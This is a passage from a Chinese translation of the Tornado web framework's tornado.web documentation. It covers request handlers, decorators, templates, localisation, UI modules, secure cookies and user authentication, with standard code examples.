控制处理模板中的空格,这个选项是Tornado 3.2中新增的,之前这个功能由debug设置控制

静态文件设置:
static_hash_cache
默认True;如果是False静态url将会在每次请求重新计算,这个选项是Tornado 3.2中新增的,之前这个功能由debug设置控制

static_path
将被提供服务的静态文件所在的文件夹

static_url_prefix
静态文件的Url前缀,默认"/static/"

static_handler_class, static_handler_args
可设置成为静态文件使用不同的处理程序代替默认的tornado.web.StaticFileHandler. static_handler_args,如果设置,应该是一个关键字参数的字典传递给处理程序的initialize方法

app.listen(port, address='', **kwargs)
为应用程序在给定端口上启动一个HTTP server,返回HTTPServer对象
这是一个方便的别名用来创建一个HTTPServer对象并调用它的listen方法,HTTPServer.listen不支持传递关键字参数给HTTPServer构造器,对于高级用途如多进程模式则不要使用这个方法,创建一个HTTPServer并直接调用它的TCPServer.bind/TCPServer.start方法
在调用这个方法之后仍然需要调用IOLoop.current().start()来启动该服务

app.add_handlers(host_pattern, host_handlers)
添加给定的handler到handler表,Host模式将按照它们的添加顺序进行处理,所有匹配模式将被考虑

app.reverse_url(name, *args)
返回名为name的handler的URL路径,处理程序必须作为URLSpec添加到应用程序.
捕获组的参数将在URLSpec的正则表达式被替换,如有必要它们将被转换成string,编码成utf8,及网址转义(url-escaped)

app.log_request(handler)
写一个完成的HTTP请求到日志中,默认情况下会写到python根(root)logger,要改变这种行为无论是子类应用和复写这个方法,或者传递一个函数到应用的设置字典中作为log_function

【 URLSpec对象 】
class tornado.web.URLSpec(pattern, handler, kwargs=None, name=None)
指定URL和处理程序之间的映射,URLSpec类在tornado.web.url名称下也是可用的
pattern: 被匹配的正则表达式,任何在正则表达式的group都将作为参数传递给处理程序的get/post/等方法
handler: 被调用的RequestHandler子类
kwargs (optional): 将被传递给处理程序构造器的额外参数组成的字典
name (optional): 该处理程序的名称,被Application.reverse_url使用

【 装饰器(Decorators) 】
tornado.web.asynchronous(method)
用这个包装请求处理方法如果它们是异步的,这个装饰器适用于回调式异步方法;对于协程,使用@gen.coroutine装饰器而没有@asynchronous.(这是合理的,因为遗留原因使用两个装饰器一起来提供@asynchronous在第一个,但在这种情况下@asynchronous将被忽略)

这个装饰器应仅适用于HTTP verb methods;它的行为是未定义的对于任何其他方法,这个装饰器不会使一个方法异步; 它告诉框架该方法是异步执行的,对于这个装饰器,该方法必须(至少有时)异步的做一些事情这是有用的

如果给定了这个装饰器,当方法返回的时候响应并没有结束,它是由请求处理程序调用self.finish()来结束该HTTP请求的,没有这个装饰器,请求会自动结束当get()或post()方法返回时

class MyRequestHandler(RequestHandler):
    @asynchronous
    def get(self):
       http = httpclient.AsyncHTTPClient()
       http.fetch("http://friendfeed.com/", self._on_download)

    def _on_download(self, response):
       self.write("Downloaded!")
       self.finish()

3.1版更改:可以使用@gen.coroutine而不需@asynchronous
4.3版更改:可以返回任何东西但None或一个可yield的对象来自于被@asynchronous装饰的方法是错误的,这样的返回值之前是默认忽略的

tornado.web.authenticated(method)
使用这个装饰的方法要求用户必须登陆,如果用户未登陆他们将被重定向到已经配置的login url
如果配置login url带有查询参数,Tornado将假设你知道你正在做什么并使用它.如果不是,它将添加一个next参数这样登陆页就会知道一旦你登陆后将把你送到哪里

tornado.web.addslash(method)
使用这个装饰器给请求路径中添加丢失的slash.
例如使用了这个装饰器请求/foo将被重定向到/foo/,请求处理映射应该使用正则表达式类似r'/foo/?'和使用装饰器相结合

tornado.web.removeslash(method)
使用这个装饰器移除请求路径尾部的斜杠(slashes)
例如使用了这个装饰器请求/foo/将被重定向到/foo,请求处理映射应该使用正则表达式类似r'/foo/*'和使用装饰器相结合

tornado.web.stream_request_body(cls)[源代码]
适用于RequestHandler子类以开启流式body支持
这个装饰器意味着以下变化:
1、HTTPServerRequest.body变成了未定义,并且body参数将不再被RequestHandler.get_argument所包含
2、RequestHandler.prepare被调用当读到请求头而不是在整个请求体都被读到之后
3、子类必须定义一个方法data_received(self,data):,这将被调用0次或多次当数据是可用状态时,注意如果该请求的body是空的,data_received可能不会被调用
4、prepare和data_received可能返回Futures对象(就像通过@gen.coroutine,在这种情况下下一个方法将不会被调用直到这些 futures完成
5、常规的HTTP方法(post,put等)将在整个body被读取后被调用

在data_received和asynchronous之间有一个微妙的互动prepare: data_received的第一次调用可能出现在任何地方在调用prepare已经返回或yielded

【 RequestHandler子类 】
Tornado web应用程序的大部分工作是在RequestHandler子类下完成的,处理子类的主入口点是一个命名为处理HTTP方法的函数:get(),post()等,每个处理程序可以定义一个或多个这种方法来处理不同的HTTP动作,这些方法将被匹配路由规则的捕获组对应的参数调用

在处理程序中调用方法如RequestHandler.render或RequestHandler.write产生一个响应,render()通过名字加载一个Template并使用给定的参数渲染它,write()被用于非模板基础的输出,它接受字符串、字节和字典,字典会被编码成JSON

在RequestHandler中的很多方法的设计是为了在子类中复写和在整个应用中使用,常用的方法是定义一个BaseHandler类,复写一些方法例如write_error和get_current_user然后子类继承使用自己的BaseHandler而不是RequestHandler在所有具体的处理程序中

class tornado.web.RequestHandler(application, request, **kwargs)
HTTP请求处理的基类,子类至少应该是以下"Entry points" 部分中被定义的方法其中之一:

1、RequestHandler.initialize()
子类初始化(Hook),作为url spec的第三个参数传递的字典将作为关键字参数提供给initialize()

</pre><textarea>
class ProfileHandler(RequestHandler):
    def initialize(self, database):
        self.database = database

    def get(self, username):
        ...

app = Application([
    (r'/user/(.*)', ProfileHandler, dict(database=database)),
])

</textarea><pre>
2、RequestHandler.prepare()
在每个请求的最开始被调用,在get/post/等方法之前,通过复写这个方法,可以执行共同的初始化,而不用考虑每个请求方法
异步支持: 这个方法使用gen.coroutine或return_future装饰器来使它异步(asynchronous装饰器不能被用在prepare),如果这个方法返回一个Future对象,执行将不再进行,直到Future对象完成

3、RequestHandler.on_finish()
在一个请求结束后被调用,复写这个方法来执行清理、日志记录等,这个方法和prepare是相对应的,on_finish可能不产生任何输出,因为它是在响应被送到客户端后才被调用
执行后面任何的方法(统称为HTTP动词(verb)方法)来处理相应的HTTP方法,这些方法可以通过使用下面的装饰器:gen.coroutine,return_future或asynchronous变成异步

为了支持不再列表中的方法,可以复写类变量SUPPORTED_METHODS:

class WebDAVHandler(RequestHandler):
    SUPPORTED_METHODS = RequestHandler.SUPPORTED_METHODS + ('PROPFIND',)

    def propfind(self):
        pass

4、RequestHandler.get(*args, **kwargs)
5、RequestHandler.head(*args, **kwargs)
6、RequestHandler.post(*args, **kwargs)
7、RequestHandler.delete(*args, **kwargs)
8、RequestHandler.patch(*args, **kwargs)
9、RequestHandler.put(*args, **kwargs)
10、RequestHandler.options(*args, **kwargs)

</pre><pre>
【 处理输入请求 imput 】
处理请求的程序(request handler)可以使用self.request访问代表当前请求对象,通过HTTPServerRequest的类定义查看完整的属性列表

RequestHandler.get_argument(name, default=[], strip=True)
返回指定的name参数的值,如果没有提供默认值,那么这个参数将被视为是必须的,并且当找不到这个参数的时候会抛出一个MissingArgumentError
如果一个参数在url上出现多次则返回最后一个值,返回值永远是unicode.

RequestHandler.get_arguments(name, strip=True)
返回指定name的参数列表,如果参数不存在则返回一个空列表,返回值永远是unicode

RequestHandler.get_query_argument(name, default=[], strip=True)
从请求的query string返回给定name的参数的值,如果没有提供默认值,这个参数将被视为必须的,并且当找不到这个参数时会抛出一个MissingArgumentError异常
如果这个参数在url中多次出现,将返回最后一次的值,返回值永远是unicode.

RequestHandler.get_query_arguments(name, strip=True)
返回指定name的参数列表,如果参数不存在,将返回空列表,返回值永远是unicode

RequestHandler.get_body_argument(name, default=[], strip=True)
返回请求体中指定name的参数的值,如果没有提供默认值,这个参数将被视为必须的,并且当找不到这个参数时会抛出一个MissingArgumentError异常
如果一个参数在url上出现多次则返回最后一个值,返回值永远是unicode

RequestHandler.get_body_arguments(name, strip=True)
返回由指定请求体中指定name的参数的列表,如果参数不存在则返回一个空列表,返回值永远是unicode

RequestHandler.decode_argument(value, name=None)
从请求中解码一个参数,这个参数已经被解码现在是一个字节字符串(byte string),默认这个方法会把参数解码成utf-8并且返回一个unicode字符串,但是它可以被子类复写
这个方法既可以在get_argument()中被用作过滤器,也可以用来从url中提取值并传递给get()/post()/等
如果知道的话参数的name会被提供,但也可能为None (e.g. 在url正则表达式中未命名的组)

RequestHandler.request
tornado.httputil.HTTPServerRequest对象包含附加的请求参数包括e.g. 头部和body数据

RequestHandler.path_args
RequestHandler.path_kwargs
path_args和path_kwargs属性包含传递给HTTP verb methods的位置和关键字参数,这些属性被设置,在这些方法被调用之前,所以这些值在prepare之间是可用的

</pre>使用HTML表单格式请求的数据会被解析并且可以在一些方法中使用,例如get_query_argument和get_body_argument<textarea>
class MyFormHandler(tornado.web.RequestHandler):
    def get(self):
        self.write('<form action="/myform" method="POST">'
                   '<input type="text" name="message">'
                   '<input type="submit" value="Submit">'
                   '</form>')

    def post(self):
        self.set_header("Content-Type", "text/plain")
        self.write("You wrote " + self.get_body_argument("message"))

</textarea><pre>
由于HTLM表单编码不确定一个标签的参数是单一值还是一个列表,RequestHandler有明确的方法来允许应用程序表明是否它期望接收一个列表,对于列表使用get_query_arguments和get_body_arguments而不是它们的单数形式

通过一个表单上传的文件可以使用self.request.files,它遍历标签input type="file"的name到一个文件列表,每个文件都是一个字典的形式{"filename":..., "content_type":..., "body":...},files对象是当前唯一的如果文件上传是通过一个表单包装(i.e. a multipart/form-data Content-Type);如果没用这种格式原生上传的数据可以调用self.request.body使用,默认上传的文件是完全缓存在内存中的; 如果需要处理占用内存太大的文件可以看看stream_request_body类装饰器

由于HTML表单编码格式的怪异(e.g. 在单数和复数参数的含糊不清),Tornado不会试图统一表单参数和其他输入类型的参数,特别是不解析JSON请求体,应用程序希望使用JSON代替表单编码可以复写prepare来解析它们的请求:

</pre><textarea>
def prepare(self):
    if self.request.headers["Content-Type"].startswith("application/json"):
        self.json_args = json.loads(self.request.body)
    else:
        self.json_args = None

</textarea><pre>
【 复写RequestHandler的方法 】
除了get()/post()/等,在RequestHandler中的某些其他方法被设计成了在必要的时候让子类重写,在每个请求中会发生下面的调用序列:
1、在每次请求时生成一个新的RequestHandler对象
2、initialize()被Application配置中的初始化参数被调用,initialize通常应该只保存成员变量传递的参数;它不可能产生任何输出或调用方法,例如send_error
3、prepare()被调用,这在所有处理子类共享的基类中是最有用的,无论是使用哪种HTTP方法,prepare都会被调用,prepare可能会产生输出;如果它调用finish或redirect等处理会在这里结束
4、其中一种HTTP方法被调用:get(),post(),put()等,如果URL的正则表达式包含捕获组,它们会被作为参数传递给这个方法
5、当请求结束on_finish()方法被调用,对于同步处理程序会在get()等后立即返回,对于异步处理程序会在调用finish()后返回

最常用的一些被复写的方法包括:
write_error - 输出对错误页面使用的HTML
on_connection_close - 当客户端断开时被调用;应用程序可以检测这种情况并中断后续处理,注意这不能保证一个关闭的连接及时被发现
get_current_user - 参考用户认证
get_user_locale - 返回Locale对象给当前用户使用
set_default_headers - 可以被用来设置额外的响应头(例如自定义的Server头)

【 ouput 】
RequestHandler.set_status(status_code, reason=None)
设置响应的状态码
status_code (int) – 响应状态码,如果reason是None,它必须存在于httplib.responses
reason (string) – 用人类可读的原因短语来描述状态码,如果是None,它会由来自httplib.responses的reason填满

RequestHandler.set_header(name, value)
给响应设置指定的头部和对应的值
如果给定了一个datetime会根据HTTP规范自动的对它格式化,如果值不是一个字符串则会把它转换成字符串,之后所有头部的值都将用UTF-8编码

RequestHandler.add_header(name, value)
添加指定的响应头和对应的值,不像set_header,add_header可以被多次调用来为相同的头返回多个值

RequestHandler.clear_header(name)
清除输出头,取消之前的set_header调用,这个方法不适用于被add_header设置了多个值的头

RequestHandler.set_default_headers()
复写这个方法可以在请求开始的时候设置HTTP头
例如在这里可以设置一个自定义Server头,在一般的请求过程流里可能不会实现预期的效果,因为头部可能在错误处理(error handling)中被重置

RequestHandler.write(chunk)
把给定chunk写到输出buffer,为了把输出写到网络,使用下面的flush()方法
如果给定的chunk是一个字典则会把它作为JSON来写同时会把响应头设置为application/json,如果写JSON但设置不同的Content-Type,可以调用set_header在调用write()之后
列表不能转换为JSON因为一个潜在的跨域安全漏洞,所有的JSON输出应该包在一个字典中

RequestHandler.flush(include_footers=False, callback=None)
将当前输出缓冲区写到网络
callback参数,如果给定则可用于流控制:它会在所有数据被写到socket后执行,同一时间只能有一个flush callback停留;如果另一个flush在前一个flush的callback运行之前发生,那么前一个callback将会被丢弃
现在如果没有给定callback会返回一个Future对象

RequestHandler.finish(chunk=None)
完成响应,结束HTTP请求

RequestHandler.render(template_name, **kwargs)
使用给定参数渲染模板并作为响应

RequestHandler.render_string(template_name, **kwargs)
使用给定的参数生成指定模板,返回生成的字节字符串(以utf8),为了生成并写一个模板作为响应,使用render()

RequestHandler.get_template_namespace()
返回一个字典被用做默认的模板命名空间,可以被子类复写来添加或修改值
这个方法的结果将与tornado.template模块中其他的默认值还有render或render_string的关键字参数相结合

RequestHandler.redirect(url, permanent=False, status=None)
重定向到给定的URL,可以选择相对路径
如果指定了status参数,这个值将作为HTTP状态码;否则将通过permanent参数选择301(永久)或302(临时),默认302(临时重定向)

RequestHandler.send_error(status_code=500, **kwargs)
给浏览器发送给定的HTTP错误码,如果flush()已经被调用,它是不可能发送错误的,所以这个方法将终止响应,如果输出已经被写但尚未flush,它将被丢弃并被错误页代替
复写write_error()来自定义它返回的错误页,额外的关键字参数将被传递给write_error

RequestHandler.write_error(status_code, **kwargs)
复写这个方法来实现自定义错误页,write_error可能调用write,render,set_header等来产生一般的输出
如果错误是由未捕获的异常造成的(包括HTTPError),三个一组的exc_info将变成可用的通过kwargs["exc_info"],注意这个异常可能不是"当前(current)" 目的或方法的异常就像sys.exc_info()或traceback.format_exc

RequestHandler.clear()
重置这个响应的所有头部和内容

RequestHandler.data_received(chunk)
实现这个方法来处理请求数据流,需要stream_request_body装饰器

【 错误处理 】
如果一个处理程序抛出一个异常,Tornado会调用RequestHandler.write_error来生成一个错误页,tornado.web.HTTPError可以被用来生成一个指定的状态码;所有其他的异常都会返回一个500状态.

默认的错误页面包含一个debug模式下的调用栈和另外一行错误描述(e.g. "500: Internal Server Error"),为了创建自定义的错误页面, 复写RequestHandler.write_error(可能在一个所有处理程序共享的一个基类里面),这个方法可能产生输出通常通过一些方法,例如write和render,如果错误是由异常引起的,一个exc_info将作为一个关键字参数传递(注意这个异常不能保证是sys.exc_info当前的异常,所以write_error必须使用 e.g. traceback.format_exception代替traceback.format_exc)

也可以在常规的处理方法中调用set_status代替write_error返回一个自定义响应来生成一个错误页面,特殊的例外tornado.web.Finish在直接返回不方便的情况下能够在不调用write_error前结束处理程序

对于404错误,使用default_handler_class Application setting,这个处理程序会复写prepare而不是一个更具体的方法,例如get(),所以它可以在任何HTTP方法下工作,它应该会产生如上所说的错误页面: 要么raise一个HTTPError(404)要么复写write_error,或调用self.set_status(404)或在prepare()中直接生成响应

【 重定向 】
有两种主要的方式可以在Tornado中重定向请求:RequestHandler.redirect和使用RedirectHandler

可以在一个RequestHandler的方法中使用self.redirect()把用户重定向到其他地方,还有一个可选参数permanent,可以使用它来表明这个重定向被认为是永久的,permanent的默认值是False,这会生成一个302 Found HTTP响应状态码,适合类似在用户的POST请求成功后的重定向,如果permanent 是true,会使用301 Moved Permanently HTTP响应, 更适合e.g.在SEO友好的方法中把一个页面重定向到一个权威的URL

RedirectHandler可直接在Application路由表中配置,例如配置一个静态重定向:
app = tornado.web.Application([
    url(r"/app", tornado.web.RedirectHandler, dict(url="http://itunes.apple.com/my-app-id")),
])

RedirectHandler也支持正则表达式替换,下面的规则重定向所有以/pictures/开始的请求用/photos/前缀代替:

app = tornado.web.Application([
    url(r"/photos/(.*)", MyPhotoHandler),
    url(r"/pictures/(.*)", tornado.web.RedirectHandler, dict(url=r"/photos/\1")),
])

不像RequestHandler.redirect, RedirectHandler默认使用永久重定向,这是因为路由表在运行时不会改变,而且被认为是永久的,当在处理程序中发现重定向的时候,可能是其他可能改变的逻辑的结果,用RedirectHandler发送临时重定向,需要添加permanent=False到RedirectHandler的初始化参数

【 异步处理 】
Tornado默认会同步处理:当get()/post()方法返回,请求被认为结束并且返回响应,因为当一个处理程序正在运行的时候其他所有请求都被阻塞,任何需要长时间运行的处理都应该是异步的,这样它就可以在非阻塞的方式中调用它的慢操作了

使用coroutine装饰器是做异步最简单的方式,这允许使用yield关键字执行非阻塞I/O,并且直到协程返回才发送响应

在某些情况下协程不如回调为主的风格方便,在这种情况下tornado.web.asynchronous装饰器可以用来代替,当使用这个装饰器的时候响应不会自动发送;而请求将一直保持开放直到callback调用RequestHandler.finish,这需要应用程序确保这个方法被调用或其他用户的浏览器简单的挂起

</pre>一个使用Tornado's内置的AsyncHTTPClient调用FriendFeed API的例子<textarea>
class MainHandler(tornado.web.RequestHandler):
    @tornado.web.asynchronous
    def get(self):
        http = tornado.httpclient.AsyncHTTPClient()
        http.fetch("http://friendfeed-api.com/v2/feed/bret", callback=self.on_response)

    def on_response(self, response):
        if response.error: raise tornado.web.HTTPError(500)
        json = tornado.escape.json_decode(response.body)
        self.write("Fetched " + str(len(json["entries"])) + " entries " "from the FriendFeed API")
        self.finish()

当get()返回请求还没有完成,当HTTP客户端最终调用on_response(),这个请求仍然是开放的,通过调用self.finish(),响应最终刷到客户端
为了方便对比, 这里有一个使用协程的相同的例子:

class MainHandler(tornado.web.RequestHandler):
    @tornado.gen.coroutine
    def get(self):
        http = tornado.httpclient.AsyncHTTPClient()
        response = yield http.fetch("http://friendfeed-api.com/v2/feed/bret")
        json = tornado.escape.json_decode(response.body)
        self.write("Fetched " + str(len(json["entries"])) + " entries " "from the FriendFeed API")

</textarea><pre>
【 模板和UI 】
Tornado包含一个简单快速并灵活的模板语言
Tornado也可以使用其他的Python模板语言,虽然没有准备把这些系统整合到RequestHandler.render里面,而是简单的将模板转成字符串并传递给RequestHandler.write

配置模板
默认情况下Tornado会在和当前.py文件相同的目录查找关联的模板文件,如果想把模板文件放在不同的目录中,可以使用template_path Application setting或复写RequestHandler.get_template_path,如果不同的处理函数有不同的模板路径

为了从非文件系统位置加载模板,实例化子类tornado.template.BaseLoader并为其在应用设置(application setting)中配置template_loader

默认情况下编译出来的模板会被缓存;为了关掉这个缓存也为了使修改在重新加载后总是可见,使用应用设置(application settings)中的compiled_template_cache=False或debug=True

模板语法
一个Tornado模板仅仅是用一些标记把Python控制序列和表达式嵌入HTML或任意其他文本格式的文件中:

<ul>
{% for item in items %}
 <li>{{ escape(item) }}</li>
{% end %}
</ul>

如果把这个目标保存为"template.html"并且把它放在Python文件的相同目录下, 可以使用下面的代码渲染它:

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        items = ["Item 1", "Item 2", "Item 3"]
        self.render("template.html", title="My title", items=items)

Tornado模板支持控制语句(control statements)和表达式(expressions),控制语句被包在{% 和 %}中间,表达式被包在{{ 和 }}之间

控制语句或多或少都和Python语句类似,支持if,for,while和try, 这些都必须使用{% end %}来标识结束,也支持模板继承(template inheritance)使用extends和block标签声明

表达式可以是任意的Python表达式,包括函数调用,模板代码会在包含以下对象和函数的命名空间中执行,注意这个列表适用于使用RequestHandler.render和render_string渲染模板的情况,如果直接在RequestHandler之外使用tornado.template模块,下面这些很多都不存在
escape: tornado.escape.xhtml_escape的别名
xhtml_escape: tornado.escape.xhtml_escape的别名
url_escape: tornado.escape.url_escape的别名
json_encode: tornado.escape.json_encode的别名
squeeze: tornado.escape.squeeze的别名
linkify: tornado.escape.linkify的别名
datetime: Python datetime模块
handler: 当前的RequestHandler对象
request: handler.request的别名
current_user: handler.current_user的别名
locale: handler.locale的别名
_: handler.locale.translate的别名
static_url: handler.static_url的别名
xsrf_form_html: handler.xsrf_form_html的别名
reverse_url: Application.reverse_url的别名
所有从 ui_methods 和 ui_modules Application设置的条目

任何传递给render或render_string的关键字参数
当正在构建一个真正的应用,可能想要使用Tornado模板的所有特性,尤其是目标继承

在引擎下Tornado模板被直接转换为Python,包含在模板中的表达式会逐字的复制到一个代表模板的Python函数中,不会试图阻止模板语言中的任何东西;明确的创造一个高度灵活的模板系统,而不是有严格限制的模板系统,因此如果在模板表达式中随意填充代码,当执行它时也会得到各种随机错误

所有模板输出默认都会使用tornado.escape.xhtml_escape函数转义,这个行为可以通过传递autoescape=None给Application或tornado.template.Loader构造器来全局改变,对于一个模板文件可以使用{% autoescape None %}指令,对于一个单一表达式可以使用{% raw ...%}来代替{{ ... }},此外,在每个地方一个可选的转义函数名可以被用来代替None

虽然Tornado的自动转义在预防XSS漏洞上是有帮助的,但是它并不能胜任所有的情况,在某一位置出现的表达式,例如Javascript或CSS,可能需要另外的转义,此外要么是必须注意总是在可能包含不可信内容的HTML中使用双引号和xhtml_escape,要么必须在属性中使用单独的转义函数

国际化
当前用户的区域设置(无论他们是否登录)总是可以通过在请求处理程序中使用self.locale或在模板中使用locale进行访问. 区域的名字(e.g., en_US)可通过locale.name获得,可翻译字符串通过Locale.translate方法,模板也有一个叫做_()全局函数用来进行字符串翻译,翻译函数有两种形式:
_("Translate this string")
是直接根据当前的区域设置进行翻译, 还有:
_("A person liked this", "%(num)d people liked this", len(people)) % {"num": len(people)}
是可以根据第三个参数的值来翻译字符串单复数的,在上面的例子中,如果len(people)是1,那么第一句翻译将被返回, 其他情况第二句的翻译将会返回

翻译最通用的模式四使用Python命名占位符变量(上面例子中的 %(num)d) 因为占位符可以在翻译时变化

这是一个正确的国际化模板:
<html>
   <head>
      <title>FriendFeed - {{ _("Sign in") }}</title>
   </head>
   <body>
     <form action="{{ request.path }}" method="post">
       <div>{{ _("Username") }} <input type="text" name="username"/></div>
       <div>{{ _("Password") }} <input type="password" name="password"/></div>
       <div><input type="submit" value="{{ _("Sign in") }}"/></div>
       {% module xsrf_form_html() %}
     </form>
   </body>
 </html>

默认情况下通过用户的浏览器发送的Accept-Language头来发现用户的区域设置,如果没有发现恰当的Accept-Language值,会使用en_US,如果让用户进行自己偏爱的区域设置,可以通过复写RequestHandler.get_user_locale来覆盖默认选择的区域:

class BaseHandler(tornado.web.RequestHandler):
    def get_current_user(self):
        user_id = self.get_secure_cookie("user")
        if not user_id: return None
        return self.backend.get_user_by_id(user_id)

    def get_user_locale(self):
        if "locale" not in self.current_user.prefs:
            # Use the Accept-Language header
            return None
        return self.current_user.prefs["locale"]

如果get_user_locale返回None,那继续依靠Accept-Language头进行判断

tornado.locale模块支持两种形式加载翻译:一种是用gettext和相关的工具的.mo格式,还有一种是简单的.csv格式,应用程序在启动时通常会调用一次tornado.locale.load_translations或tornado.locale.load_gettext_translations其中之一

可以使用tornado.locale.get_supported_locales()得到应用所支持的区域(设置)列表,用户的区域是从被支持的区域中选择距离最近的匹配得到的,例如如果用户的区域是es_GT,同时es区域是被支持的,请求中的self.locale将会设置为es,如果找不到距离最近的匹配项将会使用en_US

【 UI模块 】
Tornado支持UI modules使它易于支持标准,在应用程序中复用UI组件,UI模块像是特殊的函数调用来渲染页面上的组件并且它们可以包装自己的CSS和Js

例如如果实现一个博客,并且想要有博客入口出现在首页和每篇博客页, 可以实现一个Entry模块来在这些页面上渲染它们,首先为UI模块新建一个Python模块如uimodules.py:

class Entry(tornado.web.UIModule):
    def render(self, entry, show_comments=False):
        return self.render_string("module-entry.html", entry=entry, show_comments=show_comments)

在应用设置中使用ui_modules配置告诉Tornado使用uimodules.py
from . import uimodules

class HomeHandler(tornado.web.RequestHandler):
    def get(self):
        entries = self.db.query("SELECT * FROM entries ORDER BY date DESC")
        self.render("home.html", entries=entries)

class EntryHandler(tornado.web.RequestHandler):
    def get(self, entry_id):
        entry = self.db.get("SELECT * FROM entries WHERE id = %s", entry_id)
        if not entry: raise tornado.web.HTTPError(404)
        self.render("entry.html", entry=entry)

settings = {
    "ui_modules": uimodules,
}
application = tornado.web.Application([
    (r"/", HomeHandler),
    (r"/entry/([0-9]+)", EntryHandler),
], **settings)

在一个模板中可以使用{% module %}语法调用一个模块,例如可以调用Entry模块从home.html:

{% for entry in entries %}
  {% module Entry(entry) %}
{% end %}

和 entry.html:
{% module Entry(entry, show_comments=True) %}

模块可以包含自定义的CSS和JavaScript函数,通过复写embedded_css,embedded_javascript,javascript_files或css_files方法:

class Entry(tornado.web.UIModule):
    def embedded_css(self):
        return ".entry { margin-bottom: 1em; }"

    def render(self, entry, show_comments=False):
        return self.render_string(
            "module-entry.html", show_comments=show_comments)

模块CSS和JavaScript将被加载(或包含)一次,无论模块在一个页面上被使用多少次,CSS总是包含在页面的head标签中,JavaScript总是被包含在页面最底部的body标签之前

当不需要额外的Python代码时,一个模板文件本身可以作为一个模块,例如先前的例子可以重写到下面的module-entry.html:

{{ set_resources(embedded_css=".entry { margin-bottom: 1em; }") }}
<!-- more template html... -->

这个被修改过的模块模块可以被引用:
{% module Template("module-entry.html", show_comments=True) %}

set_resources函数只能在模板中通过{% module Template(...) %}才可用,不像{% include ... %}指令,模板模块有一个明确的命名空间它们的包含模板-它们只能看到全局模板命名空间和它们自己的关键字参数

【 认证和安全 】
Cookies 和 secure cookies
可以在用户浏览器中通过set_cookie方法设置cookie:

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        if not self.get_cookie("mycookie"):
            self.set_cookie("mycookie", "myvalue")
            self.write("Your cookie was not set yet!")
        else:
            self.write("Your cookie was set!")

普通的cookie并不安全,可以通过客户端修改,如果需要通过设置cookie,例如来识别当前登录的用户,就需要给你的cookie签名防止伪造,Tornado支持通过set_secure_cookie和get_secure_cookie方法对cookie签名,想要使用这些方法,需要在创建应用时指定一个名为cookie_secret的密钥,可以在应用的设置中以关键字参数的形式传递给应用程序:

application = tornado.web.Application([
    (r"/", MainHandler),
], cookie_secret="__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__")

签名后的cookie除了时间戳和一个HMAC签名还包含编码后的cookie值,如果cookie过期或签名不匹配,get_secure_cookie将返回None就像没有设置cookie一样,上面例子的安全版本:

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        if not self.get_secure_cookie("mycookie"):
            self.set_secure_cookie("mycookie", "myvalue")
            self.write("Your cookie was not set yet!")
        else:
            self.write("Your cookie was set!")

Tornado的安全cookie保证完整性但是不保证机密性,也就是说,cookie不能被修改但它的内容对用户是可见的,密钥cookie_secret是一个对称的key,而且必须保密–任何获得这个key的人都可以伪造出自己签名的cookie

默认Tornado的安全cookie过期时间是30天,可以给set_secure_cookie使用expires_days关键字参数同时get_secure_cookie设置max_age_days参数也可以达到效果,这两个值分别通过这样设置就可以达到如下的效果,例如大多数情况下有30天有效期的cookie,但对某些敏感操作(例如修改账单信息)可以使用一个较小的max_age_days

Tornado也支持多签名密钥,使签名密钥轮换,然后cookie_secret必须是一个以整数key版本作为key,以相对应的密钥作为值的字典,当前使用的签名键必须是应用设置中key_version的集合,不过字典中的其他key都允许做cookie签名验证,如果当前key版本在cookie集合中,为了实现cookie更新, 可以通过get_secure_cookie_key_version查询当前key版本

RequestHandler.cookies
self.request.cookies的别名

RequestHandler.get_cookie(name, default=None)
获取给定name的cookie值,如果未获取到则返回默认值

RequestHandler.set_cookie(name, value, domain=None, expires=None, path='/', expires_days=None, **kwargs)
设置给定的cookie名称/值还有其他给定的选项

RequestHandler.clear_cookie(name, path='/', domain=None)
删除给定名称的cookie;受cookie协议的限制,必须传递和设置该名称cookie时候相同的path和domain来清除这个cookie(但是这里没有方法来找出在服务端所使 用的该cookie的值)

RequestHandler.clear_all_cookies(path='/', domain=None)
删除用户在本次请求中所有携带的cookie,添加path和domain参数

RequestHandler.get_secure_cookie(name, value=None, max_age_days=31, min_version=None)
如果给定的签名过的cookie是有效的则返回,否则返回None
解码后的cookie值作为字节字符串返回(不像get_cookie)
添加min_version参数,引进cookie version 2;默认版本1和2都可以接受

RequestHandler.get_secure_cookie_key_version(name, value=None)
返回安全cookie(secure cookie)的签名key版本,返回的版本号是int型的

RequestHandler.set_secure_cookie(name, value, expires_days=30, version=None, **kwargs)
给cookie签名和时间戳以防被伪造
必须在Application设置中指定cookie_secret来使用这个方法,它应该是一个长的随机的字节序列作为HMAC密钥来做签名
使用get_secure_cookie()方法来阅读通过这个方法设置的cookie
expires_days参数设置cookie在浏览器中的有效期,并且它是独立于get_secure_cookie的max_age_days参数的
安全cookie(Secure cookies)可以包含任意字节的值,而不只是unicode字符串(不像是普通cookie)
添加version参数,提出cookie version 2并将它作为默认设置

RequestHandler.create_signed_value(name, value, version=None)
产生用时间戳签名的字符串,防止被伪造
一般通过set_secure_cookie使用,但对于无cookie使用来说就作为独立的方法来提供,为了解码不作为cookie存储的值,可以在get_secure_cookie使用可选的value参数
添加version参数,提出cookie version 2并将它作为默认设置

tornado.web.MIN_SUPPORTED_SIGNED_VALUE_VERSION = 1
这个Tornado版本所支持的最旧的签名值版本,比这个签名值更旧的版本将不能被解码

tornado.web.MAX_SUPPORTED_SIGNED_VALUE_VERSION = 2
这个Tornado版本所支持的最新的签名值版本,比这个签名值更新的版本将不能被解码

tornado.web.DEFAULT_SIGNED_VALUE_VERSION = 2
签名值版本通过RequestHandler.create_signed_value产生,可通过传递一个version关键字参数复写

tornado.web.DEFAULT_SIGNED_VALUE_MIN_VERSION = 1
可以被RequestHandler.get_secure_cookie接受的最旧的签名值,可通过传递一个min_version关键字参数复写

【 用户认证 】
当前已经通过认证的用户在每个请求处理函数中都可以通过self.current_user得到,在每个模板中可以使用current_user获得,默认current_user是None

为了在应用程序中实现用户认证,需要在请求处理函数中复写get_current_user()方法来判断当前用户,比如可以基于cookie的值,这里有一个例子,这个例子允许用户简单的通过一个保存在cookie中的特殊昵称登录到应用程序中:

class BaseHandler(tornado.web.RequestHandler):
    def get_current_user(self):
        return self.get_secure_cookie("user")

class MainHandler(BaseHandler):
    def get(self):
        if not self.current_user:
            self.redirect("/login")
            return
        name = tornado.escape.xhtml_escape(self.current_user)
        self.write("Hello, " + name)

